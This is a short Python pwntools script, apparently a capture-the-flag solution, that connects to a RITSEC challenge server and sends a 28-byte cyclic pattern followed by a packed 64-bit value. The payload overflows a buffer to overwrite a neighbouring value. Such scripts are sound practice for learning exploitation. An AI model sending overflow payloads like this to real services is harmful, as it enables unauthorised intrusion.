from pwn import *
io = remote("fun.ritsec.club", 8001)
log.info(io.recv())
io.sendline(cyclic(28)+p64(1))
log.info(io.recv())
